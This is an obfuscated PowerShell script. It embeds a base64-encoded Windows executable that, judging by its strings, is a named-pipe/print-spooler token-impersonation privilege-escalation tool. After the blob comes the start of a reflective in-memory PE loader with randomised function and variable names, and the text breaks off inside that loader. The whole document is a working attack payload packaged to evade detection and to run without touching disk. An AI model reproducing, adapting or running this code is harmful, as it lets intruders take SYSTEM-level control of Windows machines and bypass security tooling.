param($arguments="")

$kCbRTprc99 = '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JBBIiXQkGEiJfCQgQVZIgezAAAAASIsF5FwAAEgzxEiJhCSwAAAARTP2SMfH/////0yJdCRASIv36BoDAABIjRXjOgAAhcB1EUiNDQg7AADos/z//+mlAgAASI0NPzsAAOii/P//D1fASI1MJHAPEUQkcP8Vvx0AAIXAD4VyAgAASI1UJEBIjUwkcP8Vxx0AAIXAD4VaAgAASItcJEBIhdsPhEwCAAAPV8AzwLkIAgAASImEJKgAAAAPEYQkiAAAAEiJhCSAAAAADxGEJJgAAAAPEUQkcP8V9B0AAEiL6EiFwHRLTIvLTI0FQj4AALoEAQAASIvI6G38//+6AQAAAEiNjCSIAAAA/xUqHAAAhcB1Lv8VeBwAAIvQSI0NRz4AAOji+///SIvN/xWZHQAASI0NAjsAAOjN+///6cgBAABFM8lMjUQkeEiNDYE+AABBjVEB/xXvGwAAhcB1Ef8VLRwAAIvQSI0NjD4AAOuzSI1EJHBBuQoAAABIiUQkOEUzwESJdCQwugMAAEDHRCQoAAgAAEiLzcdEJCAACAAA/xUMHAAASIvYSDvGdRT/Fd4bAACL0EiNDd0+AADpYf///0iLzf8V/xwAAEiF2w+EXf///w9XwEUzyUUzwDPJDxFEJEhBjVEBDxFEJFj/FacbAABIi/hIhcB1CUiNPeg+AADrNA9XwEiJfCRgSI1UJEhIi8vzD39EJFD/FUobAACFwHU+/xVoGwAAPeUDAAB0MUiNPQI/AAD/FVQbAACL0EiLz+jC+v//SI0NOzoAAOi2+v//SIvL/xUlGwAA6bYAAABIjQ1xOgAA6Jz6//9Mi0wkQEiNRCRoSIlEJChMjQVmAwAAM9JEiXQkIDPJRIl0JGj/FeIaAABIi/BIhcB1Jf8V7BoAAIvQSI0N2z4AAOhW+v//SI0NXzoAAOhK+v//SIvL6z+6iBMAAEiLz/8V1xoAAIXAdBFIjQ2cOgAA6Cf6//9Ii8vrHEiLy+gaBQAASIvL6w9IjQ3eOAAA6An6//9Ii8//FXgaAABIi8//FW8aAABIhfZ0CUiLzv8VYRoAADPASIuMJLAAA'+''+''+'bwBuAG0AZQBuAHQAQgBsAG8AYwBrACgAKQAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAOgAgACUAZAAKAAAAVwBpAG4AUwB0AGEAMABcAEQA'+'ZQBmAGEAdQBsAHQAAAAAAAAAAAAAAFsAIQBdACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBBAHMAVQBzAGUAcgAoACkAIABmAGEAaQBsAGUAZAAgAGIAZQBjAGEAdQBzAGUAIABvAGYAIABhACAAbQBpAHMAcwBpAG4AZwAgAHAAcgBpAHYAaQBsAGUAZwBlACwA'+'IAByAGUAdAByAHkAaQBuAGcAIAB3AGkAdABoACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBXAGkAdABoAFQAbwBrAGUAbgBXACgAKQAuAAoAAAAAAAAAAAAAAAAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBXAGkAdABoAFQAbwBrAGUAbgBXACgAKQAgAGYAYQBpAGwAZQBkAC4AIABFAHIAcgBvAHIAOgAgACUAZAAKAAAAAAAAAAAAWwArAF0AIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAFcAKAApACAATwBLAAoAAAAAAAAAAAAAAAAAAABbACEAXQAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAVwBpAHQAaABUAG8AawBlAG4AVwAoACkAIABpAHMAbgAnAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAG8AcAB0AGkAbwBuACAALQBpAAoAAAAAAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAQQBzAFUAcwBlAHIAKAApACAAZgBhAGkAbABlAGQALgAgAEUAcgByAG8AcgA6ACAAJQBkAAoAAAAAAAAAAABbACsAXQAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAQQBzAFUAcwBlAHIAKAApACAATwBLAAoAAAAAAAAAXABwAGkAcABlAFwAcwBwAG8AbwBsAHMAcwAAAAAAAABuAGMAYQBjAG4AXwBuAHAAAAAAAAAAAAAxADIAMwA0ADUANgA3ADgALQAxADIAMwA0AC0AQQBCAEMARAAtAEUARgAwADAALQAwADEAMgAzADQANQA2ADcAOAA5AEEAQgAAAAAAAAAAAL9lWl8AAAAADQAAAGwCAADQWwAA0E0AAAAAAAC/ZVpfAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACHAAQAEAAAAAAAAAAAAAAAAAAAAAAAAA8DIAQAEAAAAAMwBAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+DIAQAEAAAAIMwBAAQAAABAzAEABAAAAR0NUTAAQAABgHQAALnRleHQkbW4AAAAAYC0AABIAAAAudGV4dCRtbiQwMAByLQAANgAAAC50ZXh0JHgAADAAAPACAAAuaWRhdGEkNQAAAADwMgAAKAAAAC4wMGNmZwAAGDMAAAgAAAAuQ1JUJFhDQQAAAAAgMwAACAAAAC5DUlQkWENBQQAAACgzAAAIAAAALkNSVCRYQ1oAAAAAMDMAAAgAAAAuQ1JUJFhJQQAAAAA4MwAACAAAAC5DUlQkWElBQQAAAEAzAAAIAAAALkNSVCRYSUFDAAAASDMAAAgAAAAuQ1JUJFhJWgAAAABQMwAACAAAAC5DUlQkWFBBAAAAAFgzAAAIAAAALkNSVCRYUFoAAAAAYDMAAAgAAAAuQ1JUJFhUQQAAAABoMwAACAAAAC5DUlQkWFRaAAAAAHAzAABgKAAALnJkYXRhAADQWwAAcAIAAC5yZGF0YSR6enpkYmcAAABAXgAACAAAAC5ydGMkSUFBAAAAAEheAAAIAAAALnJ0YyRJWloAAAAAUF4AAAgAAAAucnRjJFRBQQAAAABYXgAACAAAAC5ydGMkVFpaAAAAAGBeAADsAgAALnhkYXRhAABMYQAA8AAAAC5pZGF0YSQyAAAAADxiAAAUAAAALmlkYXRhJDMAAAAAUGIAAPACAAAuaWRhdGEkNAAAAABAZQAA1gcAAC5pZGF0YSQ2AAAAAABwAABAAAAALmRhdGEAAABAcAAAEAYAAC5ic3MAAAAAAIAAAKwCAAAucGRhdGEAAACQAABgAAAALnJzcmMkMDEAAAAAYJAAAIABAAAucnNyYyQwMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGwQAG1IXcBZgFTABEQQAEXINYAxQCzAhBQIABXQHAHAQAACuEAAAbF4AACEFAgAF5AYArhAAALUQAAB4XgAAIQAAAK4QAAC1EAAAeF4AACEAAgAAdAcAcBAAAK4QAABsXgAAIQAAAHAQAACuEAAAbF4AAAEPBgAPZAcADzQGAA8yC3AZLwsAHXQ'+'dAB1kHAAdVBsAHTQaAB0BGAAW4AAAWCwAALAAAAAZGgQADNIF4AMwAlBYLAAAYAAAACEIAgAI9BQAYBYAAHwWAAAIXwAAIQgCAAhkEgB8FgAAXxcAABxfAAAhCAIACHQTAF8XAAByFwAAMF8AACEAAABfFwAAchcAADBfAAAhAAAAfBYAAF8XAAAcXwAAIQAAAGAWAAB8FgAACF8AABkpCQAXZBwAFzQbABcBFgAQ8A7gDHAAANQsAAABAAAA2RkAAHwaAAABAAAAfBoAAKEAAAAZIAUAEnQnABIBIgAGUAAAWCwAAAABAAAhCAIACDQlABAbAAAzGwAAvF8AACEIAgAIZCYAMxsAAHAcAADUXwAAIQAAADMbAABwHAAA1F8AA'+'CEAAAAQGwAAMxsAALxfAAAZEwEABKIAAFgsAABAAAAAIQUCAAU0CgDgHgAAMh8AABxgAAAhAAAA4B4AADIfAAAcYAAAGRMBAARiAABYLAAAKAAAAAEAAAABBgIABjICMAEEAQAEQgAACQ8GAA9kCQAPNAgAD1ILcLArAAACAAAAISEAACYiAAByLQAAJiIAAFoiAABsIgAAci0AACYiAAABBgIABjICUAEJAQAJYgAAAQgEAAhyBHADYAIwCQQBAAQiAACwKwAAAQAAAB8lAACnJQAAkC0AAKclAAABAgEAAlAAAAENBAANNAkADTIGUAEVBQAVNLoAFQG4AAZQAAABCgQACjQGAAoyBnABDwYAD2QGAA80BQAPEgtwAQAAAAECAQACMAAAARkKABl0CQAZZAgAGVQHABk0BgAZMhXgwGIAAAAAAAAAAAAADmYAAHAwAABQYgAAAAAAAAAAAABqZwAAADAAAJBjAAAAAAAAAAAAAAhoAABAMQAA0GMAAAAAAAAAAAAASGgAAIAxAADoYwAAAAAAAAAAAACqaAAAmDEAAPhkAAAAAAAAAAAAAORqAACoMgAAMGUAAAAAAAAAAAAABGsAAOAyAAAQZAAAAAAAAAAAAAAmawAAwDEAACBkAAAAAAAAAAAAAEhrAADQMQAAYGQAAAAAAAAAAAAAaGsAABAyAABQZAAAAAAAAAAAAACKawAAADIAAEBkAAAAAAAAAAAAAKprAADwMQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyZgAAAAAAAFJnAAAAAAAAQmcAAAAAAAAsZwAAAAAAABRnAAAAAAAA+mYAAAAAAADmZgAAAAAAAMhmAAAAAAAAqGYAAAAAAACQZgAAAAAAAFhmAAAAAAAARGYAAAAAAAAcZgAAAAAAAAAAAAAAAAAA+mUAAAAAAADmZQAAAAAAANZlAAAAAAAAyGUAAAAAAAC0ZQAAAAAAAKRlAAAAAAAAlGUAAAAAAAB+ZQAAAAAAAGhlAAAAAAAAVGUAAAAAAABAZQAAAAAAAO5sAAAAAAAA2GwAAAAAAAC+bAAAAAAAAKhsAAAAAAAAkmwAAAAAAAB4bAAAAAAAAFxsAAAAAAAASGwAAAAAAAAqbAAAAAAAAA5sAAAAAAAA+msAAAAAAADgawAAAAAAAMxrAAAAAAAAAm0AAAAAAAAAAAAAAAAAAPpnAAAAAAAA6GcAAAAAAAC6ZwAAAAAAAHhnAAAAAAAAimcAAAAAAACaZwAAAAAAANZnAAAAAAAAAAAAAAAAAAAUaAAAAAAAAC5oAAAAAAAAAAAAAAAAAABUaAAAAAAAAKBoAAAAAAAAgmgAAAAAAABsaAAAAAAAAAAAAAAAAAAAAGkAAAAAAAAAAAAAAAAAACZpAAAAAAAALmkAAAAAAAByagAAAAAAAAAAAAAAAAAAXGoAAAAAAAAAAAAAAAAAAFppAAAAAAAAAAAAAAAAAAD+aQAAAAAAADhpAAAAAAAASmkAAAAAAAAkagAAAAAAABpqAAAAAAAAymoAAAAAAADYagAAAAAAAJJqAAAAAAAAbmkAAAAAAADoaQAAAAAAAAxqAAAAAAAAhmkAAAAAAAAuagAAAAAAAK5qAAAAAAAA4GkAAAAAAADSaQAAAAAAAMZpAAAAAAAApmkAAAAAAAAAAAAAAAAAAORoAAAAAAAA8GkAAAAAAACCagAAAAAAALxoAAAAAAAACmkAAAAAAADaaAAAAAAAAAAAAAAAAAAAzmgAAAAAAAAAAAAAAAAAAB0CR2V0Q3VycmVudFByb2Nlc3MA3ABDcmVhdGVOYW1lZFBpcGVXAADmBVdhaXRGb3JTaW5nbGVPYmplY3QA5wJHZXRTeXN0ZW1EaXJlY3RvcnlXAL8AQ3JlYXRlRXZlbnRXAABnAkdldExhc3RFcnJvcgAAIQJHZXRDdXJyZW50VGhyZWFkAACGAENsb3NlSGFuZGxlAPIAQ3JlYXRlVGhyZWFkAADlAUdldENvbXB1dGVyTmFtZVcAAJwAQ29ubmVjdE5hbWVkUGlwZQAAS0VSTkVMMzIuZGxsAABwAUdldFRva2VuSW5mb3JtYXRpb24AGgJPcGVuVGhyZWFkVG9rZW4A8QBEdXBsaWNhdGVUb2tlbkV4AACBAENvbnZlcnRTdHJpbmdTZWN1cml0eURlc2NyaXB0b3JUb1NlY3VyaXR5RGVzY3JpcHRvclcAAIsAQ3JlYXRlUHJvY2Vzc0FzVXNlclcAAI8BSW5pdGlhbGl6ZVNlY3VyaXR5RGVzY3JpcHRvcgAAjAFJbXBlcnNvbmF0ZU5hbWVkUGlwZUNsaWVudAAAFQJPcGVuUHJvY2Vzc1Rva2VuAACNAENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XAK0BTG9va3VwUHJpdmlsZWdlTmFtZVcAAPQCU2V0VG9rZW5JbmZvcm1hdGlvbgDBAlJldmVydFRvU2VsZgAAHwBBZGp1c3RUb2tlblByaXZpbGVnZXMAQURWQVBJMzIuZGxsAACkAE5kckNsaWVudENhbGwzAAAmAlV1aWRUb1N0cmluZ1cAdgFScGNCaW5kaW5nRnJvbVN0cmluZ0JpbmRpbmdXAAAQAlJwY1N0cmluZ0JpbmRpbmdDb21wb3NlVwAAFAJScGNTdHJpbmdGcmVlVwAAdAFScGNCaW5kaW5nRnJlZQAAHQJVdWlkQ3JlYXRlAABSUENSVDQuZGxsAAAKAERlc3Ryb3lFbnZpcm9ubWVudEJsb2NrAAMAQ3JlYXRlRW52aXJvbm1lbnRCbG9jawAAVVNFUkVOVi5kbGwACABfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAGwBfX2N1cnJlbnRfZXhjZXB0aW9uABwAX19jdXJyZW50X2V4Y2VwdGlvbl9jb250ZXh0AD4AbWVtc2V0AABWQ1JVTlRJTUUxNDAuZGxsAAAAAF9fYWNydF9pb2JfZnVuYwBKAF93Y3NpY21wAAB3AGZmbHVzaAAABwBfX3N0ZGlvX2NvbW1vbl92ZndwcmludGYAAHMAd2NzdG91bAARAF9fc3RkaW9fY29tbW9uX3Zzd3ByaW50ZgAAGABmcmVlAAAZAG1hbGxvYwAAQABfc2VoX2ZpbHRlcl9leGUAQgBfc2V0X2FwcF90eXBlAAkAX19zZXR1c2VybWF0aGVycgAAGQBfY29uZmlndXJlX3dpZGVfYXJndgAANQBfaW5pdGlhbGl6ZV93aWRlX2Vudmlyb25tZW50AAApAF9nZXRfaW5pdGlhbF93aWRlX2Vudmlyb25tZW50ADYAX2luaXR0ZXJtADcAX2luaXR0ZXJtX2UAVQBleGl0AAAjAF9leGl0AFQAX3NldF9mbW9kZQAABABfX3BfX19hcmdjAAAGAF9fcF9fX3dhcmd2ABYAX2NleGl0AAAVAF9jX2V4aXQAPQBfcmVnaXN0ZXJfdGhyZWFkX2xvY2FsX2V4ZV9hdGV4aXRfY2FsbGJhY2sAAAgAX2NvbmZpZ3RocmVhZGxvY2FsZQAWAF9zZXRfbmV3X21vZGUAAQBfX3BfX2NvbW1vZGUAADQAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA8AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AHgBfY3J0X2F0ZXhpdABnAHRlcm1pbmF0ZQBhcGktbXMtd2luLWNydC1zdGRpby1sMS0xLTAuZGxsAGFwaS1tcy13aW4tY3J0LXN0cmluZy1sMS0xLTAuZGxsAABhcGktbXMtd2luLWNydC1jb252ZXJ0LWwxLTEtMC5kbGwAYXBpLW1zLXdpbi1jcnQtaGVhcC1sMS0xLTAuZGxsAABhcGktbXMtd2luLWNydC1ydW50aW1lLWwxLTEtMC5kbGwAYXBpLW1zLXdpbi1jcnQtbWF0aC1sMS0xLTAuZGxsAABhcGktbXMtd2luLWNydC1sb2NhbGUtbDEtMS0wLmRsbAAA0wRSdGxDYXB0dXJlQ29udGV4dADaBFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAAOEEUnRsVmlydHVhbFVud2luZAAAvAVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAHsFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAJoFVGVybWluYXRlUHJvY2VzcwAAiQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AFAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAHgJHZXRDdXJyZW50UHJvY2Vzc0lkACICR2V0Q3VycmVudFRocmVhZElkAADwAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAGwDSW5pdGlhbGl6ZVNMaXN0SGVhZACCA0lzRGVidWdnZXJQcmVzZW50AH4CR2V0TW9kdWxlSGFuZGxlVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAzV0g0mbU//8yot8tmSsAAP////8BAAAAAQAAA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'
 
function digressions
{


[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $cprRzWpK99,

    [Parameter(Position = 1)]
    [String[]]
    $TGBzLQCs99,

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $puJTWmod99 = 'Void',

    [Parameter(Position = 3)]
    [String]
    $eahMKUAG99,

    [Parameter(Position = 4)]
    [Int32]
    $thdFCZIY99,

    [Parameter(Position = 5)]
    [String]
    $AnnKTTKI99,

    [Switch]
    $ZUvfhSeS99,

    [Switch]
    $tikoqwtD99
)

Set-StrictMode -Version 2


$mSsNHUVM99 = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $cprRzWpK99,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $puJTWmod99,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $thdFCZIY99,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $AnnKTTKI99,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ZUvfhSeS99
    )

    Function elucidation
    {
        $rksQRGqN99 = New-Object System.Object

        $wLiEEUKd99 = [AppDomain]::CurrentDomain
        $DtGSSSpW99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $GpzLCYQv99 = $wLiEEUKd99.DefineDynamicAssembly($DtGSSSpW99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $pImZUhzV99 = $GpzLCYQv99.DefineDynamicModule('DynamicModule', $false)
        $GcqStpIO99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]



        $MirWLJWO99 = $pImZUhzV99.DefineEnum('MachineType', 'Public', [UInt16])
        $MirWLJWO99.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $MirWLJWO99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $MirWLJWO99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $MirWLJWO99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $fRtQeXnp99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $fRtQeXnp99

        $MirWLJWO99 = $pImZUhzV99.DefineEnum('MagicType', 'Public', [UInt16])
